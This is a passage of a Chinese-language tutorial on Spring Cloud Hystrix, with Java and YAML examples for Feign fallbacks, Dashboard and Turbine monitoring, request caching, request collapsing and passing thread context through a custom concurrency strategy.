1234567891011121314@Componentpublic class DeptClientFallbackServiceFactory implements FallbackFactory&lt;DeptClientService&gt; { @Override public DeptClientService create(Throwable throwable) { return new DeptClientService() { @Override public String getDept(String deptName) { return "the dept not exist in this system, please confirm deptName"; } }; }} 在 Feign Client 工程里，创建启动主类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class FeignClientApplication { public static void main(String[] args) { SpringApplication.run(FeignClientApplication.class, args); }} 在 Feign Client 工程里，创建用于测试的 Controller 类： 123456789101112@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptClientService clientService; @GetMapping("/get") public String get(String deptName) { return clientService.getDept(deptName); }} 在 Feign Client 工程里，配置 pom.xml 文件，让 Feign 启用 Hystrix： 1234567891011121314151617server: port: 8082spring: application: name: feign-clienteureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truefeign: hystrix: enabled: true 测试 Feign 使用 Hystrix 的效果： 启动 Eureka Server、Provider 应用 当设置 feign.hystrix.enabled=false 时，启动 Feign-Client 应用，访问 http://127.0.0.1:8082/dept/get?deptName=IT，服务端返回 500 错误页面 当设置 feign.hystrix.enabled=true 时，启动 Feign-Client 应用，访问 http://127.0.0.1:8082/dept/get?deptName=IT ，服务端返回 the dept not exist in this system, please confirm deptName，这时说明 Hystrix 已经产生作用 Hystrix DashboardHystrix Dashboard 仪表盘是根据系统一段时间内发生的请求情况来展示的可视化面板，这些信息是每个 HystrixCommand 执行过程中的信息，这些信息是一个指标集合和具体的系统运行情况。创建 eureka-server、provider-service、feign-client 工程，其中 provider-service 提供了一个接口返回信息。由于 Hystrix 的指标是需要端口进行支撑的，因此 provider-service 工程需要增加 actuator 依赖，并公开 hystrix.stream 端点以便能被访问到，点击下载完整的案例代码。 配置 provider-service 工程里的 pom.xml，加入以下依赖： 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 配置 provider-service 工程里的 application.yml，当 Spring Cloud 的版本高于 Dalston 时，建议确认 management.endpoints.web.exposure.include 包含的有 hystrix.stream 或者直接为 *；否则访问 http://127.0.0.1:8080/actuator/hystrix.stream 时可能会返回 404 错误页面 12345678910111213141516171819server: port: 8080spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truemanagement: endpoints: web: exposure: include: hystrix.stream 创建 hystrix-dashboard 工程，引入 spring-cloud-starter-netflix-hystrix-dashboard 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 在 hystrix-dashboard 工程里，创建启动主类，添加 @EnableHystrixDashboard 注解： 12345678@SpringBootApplication@EnableHystrixDashboardpublic class DashboardApplication { public static void main(String[] args) { SpringApplication.run(DashboardApplication.class, args); }} 在 hystrix-dashboard 工程里，添加 application.yml 文件 12server: port: 8000 测试 Hystrix Dashboard 的运行效果： 分别启动 eureka-server、provider-service、feign-client、hystrix-dashboard 应用 访问 Hystrix Dashboard 的首页：http://127.0.0.1:8091/hystrix，查看首页截图 查看 provider-server 应用的监控信息： http://127.0.0.1:8080/actuator/hystrix.stream，目前 Spring Cloud Finchley 版的 SpringBoot 版本是 2.0，所以访问路径需要加上 /actuator，否则会访问不到监控页面，查看监控信息截图 在 Hystrix Dashboard 的首页中，填写 provider-server 应用的监控地址 http://127.0.0.1:8080/actuator/hystrix.stream，点击 Monitor Stream 按钮，跳转到监控图表页面，查看图表页面截图 调用 feigh-client 的接口：http://127.0.0.1:8082/dept/get?deptName=IT，更换不同的 deptName 参数值，观察 Hystrix Dashboard 监控页面上的图表变化 Hystrix Dashboard 各项指标参数的含义： Turbine 聚合 Hystrix上面讲的是单个实例的 Hystrix Dashboard，但在整个系统和集群的情况下不是特别有用，所以需要一种方式来聚合整个集群下的监控状况，Turbine 就是用来聚合所有相关的 hystrix.stream 流的方案，然后在 Hystrix Dashboard 中显示，具体原理如下图： 创建 eureka-server、provider-service-user、provider-service-dept、hystrix-dashboard 工程后，再创建 hystrix-turbine 工程，用来聚合集群里的 hystrix.stream 流。为了学习方便，也可以将 hystrix-turbine 工程整合到 hystrix-dashboard 工程里，点击下载完整的案例代码。 配置 hystrix-turbine 工程里的 pom.xml 文件，由于 Turbine 依赖 Eureka 的服务注册发现，因此需要另外引入 spring-cloud-starter-netflix-eureka-client 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-turbine&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 配置 hystrix-turbine 工程的 application.yml 文件： 12345678910111213141516171819202122server: port: 8093spring: application: name: turbine-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: trueturbine: aggregator: clusterConfig: default #指定聚合哪些集群，多个使用","分割，默认为default。可使用http://.../turbine.stream?cluster={clusterConfig之一}访问 appConfig: provider-dept,provider-user #配置Eureka中的serviceId列表，表明监控哪些服务 clusterNameExpression: "\'default\'" # 1.当clusterNameExpression: default时，turbine.aggregator.clusterConfig可以不写，因为默认就是default # 2.当clusterNameExpression指定集群名称，默认表达式appName；此时：turbine.aggregator.clusterConfig需要配置想要监控的应用名称 # 3.当clusterNameExpression: metadata[\'cluster\']时，假设想要监控的应用配置了eureka.instance.metadata-map.cluster: ABC，则需要配置，同时turbine.aggregator.clusterConfig: ABC 创建 hystrix-turbine 工程里的启动主类，添加 @EnableTurbine 注解后，会自动启用 Eureka Client： 12345678@EnableTurbine@SpringBootApplicationpublic class TurbineApplication { public static void main(String[] args) { SpringApplication.run(TurbineApplication.class, args); }} 测试 Turbine 的运行效果： 分别启动 eureka-server、provider-service-user、provider-service-dept 应用 启动 hystrix-turbine 应用，访问 http://127.0.0.1:8093/turbine.stream，观察是否能获取到集群监控信息 启动 hystrix-dashboard 应用，访问 Hystrix Dashboard 的首页 http://127.0.0.1:8094/hystrix，在页面上填写 hystrix-turbine 应用的监控地址 http://127.0.0.1:8093/turbine.stream，然后点击 Monitor Stream 按钮，跳转到监控图表页面，查看图表页面截图 分别访问 provider-service-user 应用：http://127.0.0.1:8092/user/getUser?userName=Jim、provider-service-dept 应用：http://127.0.0.1:8091/dept/getDept?deptName=IT，观察 Hystrix Dashboard 监控页面上的图表变化 Hystrix 进阶Hystrix 配置说明Hystrix 的配置比较多，具体可以参考：官方英文文档，第三方中文文档 Hystrix 命令注解的区别Hystrix 在使用过程中除了 HystrixCommand 还有 HystrixObservableCommand，这两个命令有很多共同点，如都支持故障和延迟容错、断路器、指标统计，两者的区别如下： HystrixCommand 默认是阻塞式的，可以提供同步和异步两种方式，但 HystrixObservableCommand 是非阻塞式的，默认只能是异步的 HystrixCommand 执行的方法是 run，HystrixObservableCommand 执行的是 construct HystrixCommand 一个实例一次只能发一条数据出去，HystrixObservableCommand 可以发送多条数据 Hystrix 异常机制和处理5 种会被 fallback 截获的情况Hystrix 的异常处理中，有 5 种出错的情况会被 fallback 所截获，从而触发 fallback，这些情况分别是： 有一种异常是不会触发 fallback 的，且不会被计数进入熔断，它是 BAD_REQUEST，会抛出 HystrixBadRequestException，这种异常一般对应的是由非法参数或者一些非系统异常引起的，对于这种异常可以根据响应创建对应的异常进行异常封装或者直接处理。 1234567891011121314151617/** * HystrixBadRequestException 不会触发 fallback */@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { throw new HystrixBadRequestException("HystrixBadRequestException Error"); } public String defaultUser(String userName) { return "the user not exist in this system"; }} 获取 fallback 里的异常信息若想在 @HystrixCommand 里获取异常信息，只需要在方法内指定 Throwable 参数； 123456789101112131415@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { throw new RuntimeException("the user not exist"); } public String defaultUser(String userName, Throwable throwable) { System.out.println(throwable.getMessage()); return "the user not exist in this system"; }} 或者继承 @HystrixCommand 的命令，通过方法来获取异常： 123456789101112131415161718192021222324252627282930@RestControllerpublic class ExceptionController { @GetMapping("/getPSFallbackOtherExpcetion") public String pSFallbackOtherExpcetion(){ String result = new PSFallbackOtherExpcetion().execute(); return result; }}/** * 继承HystrixCommand */public class PSFallbackOtherExpcetion extends HystrixCommand&lt;String&gt;{ public PSFallbackOtherExpcetion() { super(HystrixCommandGroupKey.Factory.asKey("GroupOE")); } @Override protected String run() throws Exception { throw new Exception("this command will trigger fallback"); } @Override protected String getFallback() { System.out.println(getFailedExecutionException().getMessage()); return "invoke PSFallbackOtherExpcetion fallback method"; }} 在 Feign Client 中可以用 ErrorDecoder 实现对这类异常的包装，在实际的使用中，很多时候调用接口会抛出这些 400-500 之间的错误，此时可以通过它进行封装： 12345678910111213141516@Componentpublic class FeignErrorDecoder implements feign.codec.ErrorDecoder { @Override public Exception decode(String methodKey, Response response) { try { if (response.status() &gt;= 400 &amp;&amp; response.status() &lt;= 499) { String error = Util.toString(response.body().asReader()); return new HystrixBadRequestException(error); } } catch (IOException e) { System.out.println(e); } return feign.FeignException.errorStatus(methodKey, response); }} fallback 会抛出异常的情况 Hystrix 请求缓存Hystrix 请求缓存是指 Hystrix 在同一个上下文请求中缓存请求结果，它与传统理解的缓存有一定区别；Hystrix 的请求缓存是在同一个请求中进行，在进行第一次调用结束后对结果缓存，然后接下来同参数的请求将会使用第一次缓存的结果，缓存的生命周期只在这一次请求中有效。使用 HystrixCommand 有两种方式，第一次种是继承，第二种是直接注解，缓存也同时支持这两种使用方式。具体使用例子如下，点击下载完整的案例代码。 使用类来开启缓存Hystrix 的缓存是在一次请求内有效，这要求请求要在一个 Hystrix 上下文里，不然在使用缓存的时候 Hystrix 会报一个没有初始化上下文的异常；可以使用 filter 过滤器或者 Interceptor 拦截器进行初始化，下面将使用一个拦截器来举例。使用类的方式很简单，只需要继承 HystrixCommand，然后重写它的 getCacheKey 方法即可，保证对于同一个请求返回同样的键值；对于缓存的清除，则可以调用 HystrixRequestCache 类的 clean 方法即可。 拦截器类： 1234567891011121314151617181920public class CacheContextInterceptor implements HandlerInterceptor { private HystrixRequestContext context; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { this.context = HystrixRequestContext.initializeContext(); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { this.context.shutdown(); }} 创建配置类，用于注册拦截器： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } @Bean public CacheContextInterceptor userContextInterceptor() { return new CacheContextInterceptor(); }} 1234567891011@Configurationpublic class WebMvcConfiguration extends WebMvcConfigurerAdapter { @Autowired CacheContextInterceptor userContextInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(userContextInterceptor); }} 继承 HystrixCommand 类： 12345678910111213141516171819202122232425262728293031323334public class UserCommand extends HystrixCommand&lt;String&gt; { private String userName; private RestTemplate restTemplate; private static final Logger logger = LoggerFactory.getLogger(UserCommand.class); private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey("CommandKey"); public UserCommand(String userName, RestTemplate restTemplate) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey("CacheGroup")).andCommandKey(KEY)); this.userName = userName; this.restTemplate = restTemplate; } @Override protected String run() throws Exception { String result = restTemplate.getForObject("http://PROVIDER/user/getUser?userName={1}", String.class, this.userName); logger.info(result); return result; } @Override protected String getFallback() { return super.getFallback(); } @Override protected String getCacheKey() { return this.userName; } public static void cleanCache(String userName) { HystrixRequestCache.getInstance(KEY, HystrixConcurrencyStrategyDefault.getInstance()).clear(userName); }} 用于测试的 Controller 类： 123456789101112131415161718192021@RestController@RequestMapping("/user")public class UserController { private static final Logger logger = LoggerFactory.getLogger(UserController.class); @Autowired private RestTemplate restTemplate; @GetMapping("/get") public String get(String userName) { UserCommand commandOne = new UserCommand(userName, restTemplate); commandOne.execute(); logger.info("from cache: " + commandOne.isResponseFromCache()); UserCommand commandTwo = new UserCommand(userName, restTemplate); commandTwo.execute(); logger.info("from cache: " + commandTwo.isResponseFromCache()); return "cache test finished"; }} 启动主类： 123456789@EnableHystrix@EnableDiscoveryClient@SpringBootApplicationpublic class CacheApplication { public static void main(String[] args) { SpringApplication.run(CacheApplication.class, args); }} 访问 http://127.0.0.1:8082/user/get?userName=Tom，调用了两次 execute 方法，使用 Hystrix 的默认方法 isResponseFromCache 来判断请求结果是否来自于缓存，从以下输出可以看出第二次请求确实来自于缓存，此时说明 Hystrix 的缓存生效了。 12c.s.study.controller.CacheController : from cache: falsec.s.study.controller.CacheController : from cache: true 使用注解开启缓存Hystrix 提供了注解来使用缓存机制，且更为方便和快捷，使用 @CacheResult 和 @CacheRemove 即可缓存数据和清除缓存。 使用注解缓存数据： 12345678910111213141516@Servicepublic class DeptService { private static final Logger logger = LoggerFactory.getLogger(DeptService.class); @Autowired private RestTemplate restTemplate; @CacheResult @HystrixCommand public String getDept(String deptName) { String result = restTemplate.getForObject("http://PROVIDER/dept/getDept?deptName={1}", String.class, deptName); logger.info(result); return result; }} 用于测试的 Controller 类： 1234567891011121314@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptService deptService; @GetMapping("/get") public String get(String deptName) { deptService.getDept("IT"); deptService.getDept("IT"); return "annotation cache test finished"; }} 访问 http://127.0.0.1:8082/dept/get?deptName=IT，调用了两次 get 方法，发现只打印了一条数据，说明第二次的请求是从缓存中读取，即 Hystrix 的缓存生效了。 使用注解清除缓存使用 commandKey 参数来指定 HystrixCommand 的 key，在清除缓存时，可以直接附加这个值来清除指定的参数： 1234567891011121314151617181920212223@Servicepublic class DeptService { private static final Logger logger = LoggerFactory.getLogger(DeptService.class); @Autowired private RestTemplate restTemplate; @CacheResult @HystrixCommand(commandKey = "findDept") public String findDept(@CacheKey String deptName) { String result = restTemplate.getForObject("http://PROVIDER/dept/getDept?deptName={1}", String.class, deptName); logger.info(result); return result; } @CacheRemove(commandKey = "findDept") @HystrixCommand public String updateDept(@CacheKey String deptName) { logger.info("delete dept cache"); return "update dept success"; }} 用于测试的 Controller 类： 1234567891011121314151617181920@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptService deptService; @GetMapping("/find") public String find(String deptName) { // 调用接口并缓存数据 deptService.findDept("IT"); deptService.findDept("IT"); // 清除缓存 deptService.updateDept(deptName); // 再调用接口 deptService.findDept("IT"); deptService.findDept("IT"); return "annotation cache test finished"; }} 访问 http://127.0.0.1:8082/dept/find?deptName=IT，运行结果如下；在没有缓存的情况下，打印了一次，第二次取的是缓存数据，然后清除缓存后又打印了一次，最后一次又从缓存里取数据： 123DeptService : {"id":1,"deptName":"IT"}DeptService : delete dept cacheDeptService : {"id":1,"deptName":"IT"} 缓存使用注意事项Hystrix 常用缓存注解： @CacheResult：使用该注解后结果会被缓存，同时它需要和 @HystrixCommand 注解一起使用，注解参数为 cacheKeyMethod @CacheRemove：清除缓存，需要指定 commandKey，注解参数为 commandKey、cacheKeyMethod @CacheKey：指定请求命令参数，默认使用方法里的所有参数作为 Key，注解参数为 value 一般在查询接口上使用 @CacheResult，在更新、删除接口上使用 @CacheRemove 删除缓存 使用 Hystrix 缓存时有几方面需要注意： 需要使用 @EnableHystrix 注解启用 Hystrix 需要初始化 HystrixRequestContext，无论是使用继承类还是注解的方式来开启缓存 在指定了 HystrixCommand 的 commandKey 后，在 @CacheRemove 也要指定 commandKey Hystrix Request CollapserRequest Collapser 介绍Request Collapser 是 Hystrix 推出的针对多个请求调用单个后端依赖做的一种优化和节约网络开销的方法。引用官方的这张图，当发起 5 个请求时，在请求没有聚合和合并的情况下，是每个请求单独开启一个线程，并开启一个网络链接进行调用，这都会加重应用程序的负担和开销，并占用 Hystrix 的线程连接池。当使用 Collapser 把请求都合并起来时，则只需要一个线程和一个连接的开销，这大大减少了并发和请求执行所需要的线程数和网络连接数，尤其在一个时间段内有非常多请求的情况下能极大地提高资源利用率。特别注意：若使用 Feign 调用的话，目前还不支持 Collapser。具体使用例子如下，点击下载完整的案例代码。 使用注解进行请求合并使用 Request Collapser 也可以通过继承类和注解的形式来实现，下面主要介绍注解的使用方式。 Request Collapser 和 Hystrix 缓存的使用类似，需要实现 Hystrix 上下文的初始化和关闭，这里使用拦截器来实现： 1234567891011121314151617181920public class HystrixContextInterceptor implements HandlerInterceptor { private HystrixRequestContext context; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { this.context = HystrixRequestContext.initializeContext(); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { this.context.shutdown(); }} 创建配置类，用于注册拦截器： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } @Bean public CacheContextInterceptor userContextInterceptor() { return new CacheContextInterceptor(); }} 1234567891011@Configurationpublic class WebMvcConfiguration extends WebMvcConfigurerAdapter { @Autowired CacheContextInterceptor userContextInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(userContextInterceptor); }} 实现一个 Future 异步返回值的方法，在这个方法上配置请求合并的注解，之后外部通过调用这个方法来实现请求的合并。注意：这个方法必须是 Future 异步返回值的，否则无法合并请求。其中 @HystrixCollapser 注解代表开启请求合并，调用该方法时，实际上运行的是 collapsingList 方法，且利用 HystrixProperty 指定 timerDelayInMilliseconds，这属性代表合并多少毫秒（ms）内的请求，如果不配置的话，默认是 10ms。 1234567891011121314151617181920212223242526@Servicepublic class CollapsingService implements ICollapsingService { private static final Logger logger = LoggerFactory.getLogger(CollapsingService.class); @HystrixCollapser(batchMethod = "collapsingList", collapserProperties = { @HystrixProperty(name = "timerDelayInMilliseconds", value = "1000") }) public Future&lt;User&gt; collapsing(Integer id) { return null; } @HystrixCommand public List&lt;User&gt; collapsingList(List&lt;Integer&gt; userParam) { logger.info("collapsingList当前线程: " + Thread.currentThread().getName()); logger.info("当前请求参数个数:" + userParam.size()); List&lt;User&gt; userList = new ArrayList&lt;User&gt;(); for (Integer userNumber : userParam) { User user = new User(); user.setUserName("User - " + userNumber); user.setAge(userNumber); userList.add(user); } return userList; }} 创建接口测试类，在 getUser 接口内连续调用两次 collapsing 方法： 123456789101112131415161718192021222324@RestController@RequestMapping("/user")public class CollapsingController { private static final Logger logger = LoggerFactory.getLogger(CollapsingController.class); @Autowired private ICollapsingService collapsingService; /** * 请求聚合/合并 * * @return * @throws Exception */ @RequestMapping("/getUser") public String getUser() throws Exception { Future&lt;User&gt; user = collapsingService.collapsing(1); Future&lt;User&gt; user2 = collapsingService.collapsing(2); logger.info(user.get().getUserName()); logger.info(user2.get().getUserName()); return "Success"; }} 启动主类： 123456789@EnableHystrix@EnableDiscoveryClient@SpringBootApplicationpublic class CollapsingApplication { public static void main(String[] args) { SpringApplication.run(CollapsingApplication.class, args);} 启动应用后访问 http://127.0.0.1:8082/user/getUser，可以看到实际调用了 collapsingList 方法，并打印了当前线程的名称、请求的参数和运行结果，一共合并了两个请求，达到了预期效果： 1234CollapsingService : collapsingList当前线程: hystrix-CollapsingService-1CollapsingService : 当前请求参数个数:2CollapsingController : User - 1CollapsingController : User - 2 使用注解进行请求合并（全局）上面讲了多个请求是如何合并的，但是都是在同一请求（单一线程）中发起的调用，如果两次请求接口都是在不同线程运行的，那么如何合并整个应用中的请求呢？即如何对所有线程请求中的多次服务调用进行合并呢？ @HystrixCollapser 注解的 scope 属性有个两个值，分别是：Request（默认值）、Global。下面的代码中，增加了一个 scope 属性为 Global 的方法： 1234567891011121314151617181920212223242526@Servicepublic class CollapsingService implements ICollapsingService { private static final Logger logger = LoggerFactory.getLogger(CollapsingService.class); @HystrixCollapser(batchMethod = "collapsingListGlobal", scope = Scope.GLOBAL, collapserProperties = { @HystrixProperty(name = "timerDelayInMilliseconds", value = "10000") }) public Future&lt;User&gt; collapsingGlobal(Integer id) { return null; } @HystrixCommand public List&lt;User&gt; collapsingListGlobal(List&lt;Integer&gt; userParam) { logger.info("collapsingListGlobal当前线程: " + Thread.currentThread().getName()); logger.info("当前请求参数个数:" + userParam.size()); List&lt;User&gt; userList = new ArrayList&lt;User&gt;(); for (Integer userNumber : userParam) { User user = new User(); user.setUserName("User- " + userNumber); user.setAge(userNumber); userList.add(user); } return userList; }} 增加一个调用接口来调用上述方法： 123456789101112131415161718192021222324@RestController@RequestMapping("/user")public class CollapsingController { private static final Logger logger = LoggerFactory.getLogger(CollapsingController.class); @Autowired private ICollapsingService collapsingService; /** * 请求聚合/合并,整个应用的 * * @return * @throws Exception */ @RequestMapping("/getUserGolbal") public String getUserGolbal() throws Exception { Future&lt;User&gt; user = collapsingService.collapsingGlobal(1); Future&lt;User&gt; user2 = collapsingService.collapsingGlobal(2); logger.info(user.get().getUserName()); logger.info(user2.get().getUserName()); return "Success"; }} 连续访问 http://127.0.0.1:8082/user/getUserGolbal 两次，会发现所有请求都合并在一个线程中；若改为 Request 作用域，Hystrix 则会运行两个线程来分别处理两次请求。 123456CollapsingService : collapsingListGlobal当前线程: hystrix-CollapsingService-10CollapsingService : 当前请求参数个数:4CollapsingController : User- 1CollapsingController : User- 1CollapsingController : User- 2CollapsingController : User- 2 请求合并总结Hystrix Request Collapser 主要用于请求合并的场景，在一个简单的系统中，这种场景可能很少碰到，所以对于请求合并，一般的使用场景是：当在某个时间段内有大量或并发的相同请求时，则适用使用请求合并；而如果在某个时间段内只有很少的请求，且延迟也不高，此时使用请求合并反而会增加复杂度和延迟，因为对于 Collapser 本身，Hystrix 也是需要时间进行批处理的。 Hystrix 线程传递及并发策略Hystrix 线程传递介绍Hystrix 会对请求进行封装，然后管理请求的调用，从而实现断路器等多种功能。Hystrix 提供了两种隔离模式来进行请求的操作，一种是信号量隔离，一种是线程池隔离。如果是信号量，Hystrix 则在请求的时候会获取到一个信号量，如果成功拿到，则继续进行请求，请求在同一个线程中执行完毕。如果是线程池隔离，Hystrix 会把请求放入线程池中执行，这时就有可能产生线程的变化，从而导致线程 1 的上下文数据在线程 2 里不能正常拿到。下面通过一个例子来说明，点击下载完整的案例代码。 Hystrix 线程传递问题重现建立一个 ThreadLocal 来保存用户的信息，通常在微服务里，会把当前请求的上下文数据放入本地线程变量，便于后续使用和销毁： 1234public class HystrixThreadLocal { public static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;();} 定义测试接口，打印当前线程的 ID，并利用 ThreadLocal 存放用户信息；为了兼容其他情况，例如在使用 Feign 调用的时候，通常会使用 RequestContextHolder 拿到上下文属性，在此也进行测试一下： 12345678910111213141516171819@RestController@RequestMapping("/user")public class UserController { private static final Logger logger = LoggerFactory.getLogger(UserController.class); @Autowired private UserService userService; @GetMapping("/get/{id}") public String get(@PathVariable("id") Integer id) { HystrixThreadLocal.threadLocal.set("userId: " + id); RequestContextHolder.currentRequestAttributes().setAttribute("userId", "userId: " + id, RequestAttributes.SCOPE_REQUEST); logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST)); return userService.get(id); }} 定义服务类，测试在没有使用线程池隔离模式的情况下，获取用户信息： 123456789101112@Servicepublic class UserService { private static final Logger logger = LoggerFactory.getLogger(UserService.class); public String get(Integer id) { logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST).toString()); return "Success"; }} 启动应用后访问 http://127.0.0.1:8082/user/get/2 后，可以看到打印的线程 ID 都是一样的，线程变量也是传入 2，请求上下文的持有对象也可以顺利拿到： 1234567UserController : current thread: 59UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 59UserService : thread local: userId: 2UserService : RequestContextHolder: userId: 2 服务类添加 @HystrixCommand 注解，测试在使用线程池隔离模式的情况下，获取用户信息： 12345678910111213@Servicepublic class UserService { private static final Logger logger = LoggerFactory.getLogger(UserService.class); @HystrixCommand public String get(Integer id) { logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST).toString()); return "Success"; }} 启动应用后访问 http://127.0.0.1:8082/user/get/2 后，会发现进入的线程池 ID 是 57，当达到后台服务的时候，线程 ID 变成 82，说明线程池的隔离已经生效，是重新启动的线程处理请求的，然后线程的变量也丢失了，RequestContextHolder 中也抛出了异常，意思是没有绑定线程变量，至此成功地重现了父子线程数据传递的问题。 1234567UserController : current thread: 57UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 82UserService : thread local: nulljava.lang.IllegalStateException: No thread-bound request found: Hystrix 线程传递问题解决方案解决 Hystrix 的线程传递问题有两种方法： 第一种：修改 Hystrix 的隔离策略，使用信号量隔离，直接修改配置文件即可，但 Hystrix 默认是线程池隔离，加上从真实的项目情况看，大部分都是使用线程池隔离，因此此方案不太推荐，对应属性为：hystrix.command.default.execution.isolation.strategy 第二种：Hystrix 官方推荐的一种方式，就是使用继承 HystrixConcurrencyStrategy 类覆盖 wrapCallable 方法，下面将介绍此方法的使用例子 创建 HystrixThreadCallable 类，该类的构造函数是希望传递 RequestContextHolder 和自定义的 HystrixThreadLocal 对象： 123456789101112131415161718192021222324public class HystrixThreadCallable&lt;S&gt; implements Callable&lt;S&gt; { private final RequestAttributes requestAttributes; private final Callable&lt;S&gt; delegate; private String params; public HystrixThreadCallable(Callable&lt;S&gt; callable, RequestAttributes requestAttributes, String params) { this.delegate = callable; this.requestAttributes = requestAttributes; this.params = params; } @Override public S call() throws Exception { try { RequestContextHolder.setRequestAttributes(requestAttributes); HystrixThreadLocal.threadLocal.set(params); return delegate.call(); } finally { RequestContextHolder.resetRequestAttributes(); HystrixThreadLocal.threadLocal.remove(); } }} 重写 HystrixConcurrencyStrategy 类的 wrapCallable 方法，在执行请求前包装 HystrixThreadCallable 对象，将需要的对象信息设置进去，这样在下一个线程中就可以拿到了： 1234567public class SpringCloudHystrixConcurrencyStrategy extends HystrixConcurrencyStrategy { @Override public &lt;T&gt; Callable&lt;T&gt; wrapCallable(Callable&lt;T&gt; callable) { return new HystrixThreadCallable&lt;&gt;(callable, RequestContextHolder.getRequestAttributes(), HystrixThreadLocal.threadLocal.get()); }} 配置类： 12345678@Configurationpublic class HystrixThreadContextConfiguration { @Bean public SpringCloudHystrixConcurrencyStrategy springCloudHystrixConcurrencyStrategy() { return new SpringCloudHystrixConcurrencyStrategy(); }} 启动应用后访问 http://127.0.0.1:8082/user/get/2 后，可以发现即使使用了 Hystrix 的线程池隔离模式，不同的线程也能顺利拿到上一个线程传递过来的信息： 1234567UserController : current thread: 59UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 84UserService : thread local: userId: 2UserService : RequestContextHolder: userId: 2 并发策略共存由于 HystrixPlugins 的 registerConcurrencyStrategy 方法只能被调用一次，即 Hystrix 不允许注册多个 Hystrix 并发策略，不然就会报错，这就导致了无法和其他并发策略一起使用，因此需要将其他并发策略注入进去，达到并存的目的，如 sleuth 的并发策略也是做了同样的事情。具体的做法就是在构造此并发策略时，找到之前已经存在的并发策略，并保留在类的属性中，在调用过程中，返回之前并发策略的相关信息，如请求变量、连接池、阻塞队列；等请求进来时，既不影响之前的并发策略，也可以包装需要的请求信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SpringCloudHystrixConcurrencyStrategy extends HystrixConcurrencyStrategy { private HystrixConcurrencyStrategy delegateHystrixConcurrencyStrategy; @Override public &lt;T&gt; Callable&lt;T&gt; wrapCallable(Callable&lt;T&gt; callable) { return new HystrixThreadCallable&lt;&gt;(callable, RequestContextHolder.getRequestAttributes(), HystrixThreadLocal.threadLocal.get()); } public SpringCloudHystrixConcurrencyStrategy() { init(); } private void init() { try { this.delegateHystrixConcurrencyStrategy = HystrixPlugins.getInstance().getConcurrencyStrategy(); if (this.delegateHystrixConcurrencyStrategy instanceof SpringCloudHystrixConcurrencyStrategy) { return; } HystrixCommandExecutionHook 